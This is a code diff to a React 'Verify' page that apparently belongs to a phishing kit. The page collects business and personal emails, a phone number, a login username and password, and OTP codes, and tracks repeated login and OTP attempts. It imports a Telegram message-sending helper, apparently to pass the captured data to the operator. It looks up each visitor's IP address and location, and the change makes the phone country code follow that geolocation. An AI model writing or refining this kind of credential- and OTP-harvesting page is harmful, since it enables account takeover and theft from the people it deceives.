@@ -1,20 +1,34 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { sendTelegramMessage, setInitialSession, escapeHtml } from '../utils/telegram';
+import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
 
 export default function Verify() {
   const navigate = useNavigate();
   const [step, setStep] = useState(1);
   const [clientIp, setClientIp] = useState('Unknown');
   
-  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); const [countryCode, setCountryCode] = useState('+84'); const [phoneNum, setPhoneNum] = useState('');
+  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
+  const [countryCode, setCountryCode] = useState('+84'); // Mặc định Việt Nam
+  const [phoneNum, setPhoneNum] = useState('');
+  
   const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
   const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
 
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
 
-  useEffect(() => { fetch('https://ipwho.is/').then(r => r.json()).then(d => { if (d && d.ip) setClientIp(`${d.ip} - ${d.country} (${d.city})`); }).catch(()=>{}); }, []);
+  // Lấy IP và tự động chọn mã vùng
+  useEffect(() => { 
+      fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
+          if (d && d.ip) {
+              setClientIp(`${d.ip} - ${d.country} (${d.city})`);
+              // Nếu API trả về mã quốc gia và có trong map thì tự đổi mã vùng
+              if (d.country_code && countryCodeMap[d.country_code]) {
+                  setCountryCode(countryCodeMap[d.country_code]);
+              }
+          }
+      }).catch(()=>{}); 
+  }, []);
 
   const handleSignup = (e) => {
     e.preventDefault(); let errs = {};
